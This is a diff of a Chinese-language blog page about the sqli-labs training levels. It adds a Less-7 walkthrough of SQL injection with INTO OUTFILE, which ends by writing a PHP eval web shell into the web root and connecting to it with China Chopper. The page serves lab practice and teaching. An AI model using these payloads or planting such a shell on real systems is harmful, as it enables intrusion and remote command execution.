@@ -82,14 +82,14 @@
 <meta name="description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
 <meta name="keywords" content="sql注入,sqli-labs,python">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs-Less-5-6">
+<meta property="og:title" content="sqli-labs-Less-5-7">
 <meta property="og:url" content="http://yoursite.com/2018/04/20/sqli-labs-Less-5-6/index.html">
 <meta property="og:site_name" content="Ahodor&#39;Via">
 <meta property="og:description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-20T07:05:28.131Z">
+<meta property="og:updated_time" content="2018-04-21T07:20:45.630Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs-Less-5-6">
+<meta name="twitter:title" content="sqli-labs-Less-5-7">
 <meta name="twitter:description" content="Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。">
 
 
@@ -126,7 +126,7 @@
 
 
 
-  <title>sqli-labs-Less-5-6 | Ahodor'Via</title>
+  <title>sqli-labs-Less-5-7 | Ahodor'Via</title>
   
 
 
@@ -304,7 +304,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs-Less-5-6</h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs-Less-5-7</h1>
         
 
         <div class="post-meta">
@@ -514,7 +514,47 @@ if __name__ == &apos;__main__&apos;:
 ::id::::username::::password::::first_name::::last_name::
 ::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4::
 </code></pre><p>有些地方还是使用了硬编码不够灵活，使用burpsuit的intruct模块爆破更快</p>
-<h2 id="Less-6-GET-Double-Query-Double-Quotes-String"><a href="#Less-6-GET-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 GET- Double Query-Double Quotes -String"></a>Less-6 GET- Double Query-Double Quotes -String</h2><h3 id="基于get方法请求的双引号双查询字符注入"><a href="#基于get方法请求的双引号双查询字符注入" class="headerlink" title="基于get方法请求的双引号双查询字符注入"></a>基于get方法请求的双引号双查询字符注入</h3><h3 id="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><a href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。" class="headerlink" title="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"></a>Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</h3><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">【科普文】双查询注入</a></p>
+<h2 id="Less-6-GET-Double-Query-Double-Quotes-String"><a href="#Less-6-GET-Double-Query-Double-Quotes-String" class="headerlink" title="Less-6 GET- Double Query-Double Quotes -String"></a>Less-6 GET- Double Query-Double Quotes -String</h2><h3 id="基于get方法请求的双引号双查询字符注入"><a href="#基于get方法请求的双引号双查询字符注入" class="headerlink" title="基于get方法请求的双引号双查询字符注入"></a>基于get方法请求的双引号双查询字符注入</h3><h3 id="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><a href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。" class="headerlink" title="Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"></a>Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</h3><h2 id="GET-Dump-into-outfile-String"><a href="#GET-Dump-into-outfile-String" class="headerlink" title="GET-Dump into outfile - String"></a>GET-Dump into outfile - String</h2><h3 id="基于get方法的导出文件的字符型注入"><a href="#基于get方法的导出文件的字符型注入" class="headerlink" title="基于get方法的导出文件的字符型注入"></a>基于get方法的导出文件的字符型注入</h3><h4 id="mysql导出数据的方法"><a href="#mysql导出数据的方法" class="headerlink" title="mysql导出数据的方法"></a>mysql导出数据的方法</h4><pre><code>select ... into outfile &apos;filename&apos; 
+</code></pre><p>select可以把被选择的行写入一个文件中，该文件被创建到服务器主机上，因此必须拥有<strong>file</strong>权限；输出不能是一个<strong>已存在的文件</strong>，防止文件数据被<strong>篡改</strong>；在unix中该文件被创建后是可读的，权限有MySQL服务器所有，<strong>只能读不能删除</strong>。</p>
+<h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><pre><code>$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;;
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+    if($row)
+    {
+    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;    
+    echo &apos;You are in.... Use outfile......&apos;;
+    echo &quot;&lt;br&gt;&quot;;
+    echo &quot;&lt;/font&gt;&quot;;
+    }
+    else 
+    {
+    echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;;
+    echo &apos;You have an error in your SQL syntax&apos;;
+    //print_r(mysql_error());
+    echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+</code></pre><p>参数<strong>id</strong>被单引号和双层括号包裹，正确时显示 You are in…. Use outfile…..  错误时显示 You have an error in your SQL syntax;</p>
+<h4 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h4><pre><code>sqli-labs/Less-7/?id=1&apos;)) %23
+sqli-labs/Less-7/?id=1&apos;)) order by 6%23 返回错误
+sqli-labs/Less-7/?id=1&apos;)) order by 5%23 返回正常
+</code></pre><h4 id="读写权限测试"><a href="#读写权限测试" class="headerlink" title="读写权限测试"></a>读写权限测试</h4><pre><code>sqli-labs/Less-7/?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 
+</code></pre><p>返回正常，说明具有读写权限</p>
+<h4 id="数据库路径和安装路径"><a href="#数据库路径和安装路径" class="headerlink" title="数据库路径和安装路径"></a>数据库路径和安装路径</h4><p>使用Less-5或Less-6的双查询注入方法发现不起作用对比了源代码后才知道在Less-7中把报错显示注释掉了。</p>
+<pre><code>//print_r(mysql_error());
+</code></pre><p>本来使用 <strong>@@basedir</strong> 和 <strong>@@datadir</strong>来查询安装路径和数据库路径<br>这里查询不了，总之前的关卡可知 <strong>C:/phpStudy/MySQL/</strong><br>和<br><strong>C:\phpStudy\MySQL\data\</strong><br>推测出目录路径为<br><strong>C:\phpStudy\WWW\sqli-labs\Less-7\</strong></p>
+<p>这里在测试的过程中把报错的注释去掉了，可以看到一个Mysql配置问题</p>
+<pre><code>--secure-file-priv option so it cannot execute this statement
+</code></pre><p>在MySQL的目录下的一个<strong>my.ini</strong>的文件中添加<br><strong>secure_file_priv = 路径</strong><br>重启后执行成功</p>
+<pre><code>sqli-labs/Less-7/?id=1&apos;)) union select 1,2,version(),4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/1.txt&quot; %23
+</code></pre><p>直接访问</p>
+<pre><code>http://192.168.83.134/sqli-labs/Less-7/1.txt
+</code></pre><p>可以看到之前写的数据，试着写入<strong>一句话</strong></p>
+<pre><code>sqli-labs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;,4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/shell.php&quot; %23
+</code></pre><p>写入成功后，能够直接访问，使用中国菜刀直接连接即可</p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="http://www.91ri.org/7636.html" target="_blank" rel="noopener">【科普文】双查询注入</a></p>
 <p><a href="https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/" target="_blank" rel="noopener">Double SQL Injection(双查询注入)</a></p>
 
       
@@ -681,7 +721,7 @@ if __name__ == &apos;__main__&apos;:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-GET-Double-Query-Single-Quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Less-5 GET- Double Query-Single Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get请求的双查询的单引号字符型注入"><span class="nav-number">1.1.</span> <span class="nav-text">基于get请求的双查询的单引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么叫双查询？"><span class="nav-number">1.2.</span> <span class="nav-text">什么叫双查询？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双查询你注入"><span class="nav-number">1.3.</span> <span class="nav-text">双查询你注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么时候使用双查询注入？"><span class="nav-number">1.4.</span> <span class="nav-text">什么时候使用双查询注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">1.5.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload"><span class="nav-number">1.6.</span> <span class="nav-text">构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字段数"><span class="nav-number">1.6.1.</span> <span class="nav-text">字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库基本信息"><span class="nav-number">1.6.2.</span> <span class="nav-text">数据库基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取信息"><span class="nav-number">1.6.3.</span> <span class="nav-text">读取信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名-改变-limit-1-1的值获取所有的"><span class="nav-number">1.6.4.</span> <span class="nav-text">数据库名(改变 limit 1,1的值获取所有的)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表名"><span class="nav-number">1.6.5.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名"><span class="nav-number">1.6.6.</span> <span class="nav-text">列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据"><span class="nav-number">1.6.7.</span> <span class="nav-text">数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-小脚本用来爆破-limit太麻烦"><span class="nav-number">1.7.</span> <span class="nav-text">python 小脚本用来爆破(limit太麻烦)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-GET-Double-Query-Double-Quotes-String"><span class="nav-number">2.</span> <span class="nav-text">Less-6 GET- Double Query-Double Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get方法请求的双引号双查询字符注入"><span class="nav-number">2.1.</span> <span class="nav-text">基于get方法请求的双引号双查询字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><span class="nav-number">2.2.</span> <span class="nav-text">Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">2.3.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5-GET-Double-Query-Single-Quotes-String"><span class="nav-number">1.</span> <span class="nav-text">Less-5 GET- Double Query-Single Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get请求的双查询的单引号字符型注入"><span class="nav-number">1.1.</span> <span class="nav-text">基于get请求的双查询的单引号字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么叫双查询？"><span class="nav-number">1.2.</span> <span class="nav-text">什么叫双查询？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双查询你注入"><span class="nav-number">1.3.</span> <span class="nav-text">双查询你注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#什么时候使用双查询注入？"><span class="nav-number">1.4.</span> <span class="nav-text">什么时候使用双查询注入？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">1.5.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造payload"><span class="nav-number">1.6.</span> <span class="nav-text">构造payload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#字段数"><span class="nav-number">1.6.1.</span> <span class="nav-text">字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库基本信息"><span class="nav-number">1.6.2.</span> <span class="nav-text">数据库基本信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取信息"><span class="nav-number">1.6.3.</span> <span class="nav-text">读取信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名-改变-limit-1-1的值获取所有的"><span class="nav-number">1.6.4.</span> <span class="nav-text">数据库名(改变 limit 1,1的值获取所有的)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表名"><span class="nav-number">1.6.5.</span> <span class="nav-text">表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#列名"><span class="nav-number">1.6.6.</span> <span class="nav-text">列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据"><span class="nav-number">1.6.7.</span> <span class="nav-text">数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#python-小脚本用来爆破-limit太麻烦"><span class="nav-number">1.7.</span> <span class="nav-text">python 小脚本用来爆破(limit太麻烦)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-GET-Double-Query-Double-Quotes-String"><span class="nav-number">2.</span> <span class="nav-text">Less-6 GET- Double Query-Double Quotes -String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get方法请求的双引号双查询字符注入"><span class="nav-number">2.1.</span> <span class="nav-text">基于get方法请求的双引号双查询字符注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。"><span class="nav-number">2.2.</span> <span class="nav-text">Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET-Dump-into-outfile-String"><span class="nav-number">3.</span> <span class="nav-text">GET-Dump into outfile - String</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于get方法的导出文件的字符型注入"><span class="nav-number">3.1.</span> <span class="nav-text">基于get方法的导出文件的字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql导出数据的方法"><span class="nav-number">3.1.1.</span> <span class="nav-text">mysql导出数据的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#源码分析"><span class="nav-number">3.1.2.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造payload-1"><span class="nav-number">3.1.3.</span> <span class="nav-text">构造payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读写权限测试"><span class="nav-number">3.1.4.</span> <span class="nav-text">读写权限测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库路径和安装路径"><span class="nav-number">3.1.5.</span> <span class="nav-text">数据库路径和安装路径</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考："><span class="nav-number">3.2.</span> <span class="nav-text">参考：</span></a></li></ol></li></ol></div>
             
 
           </div>
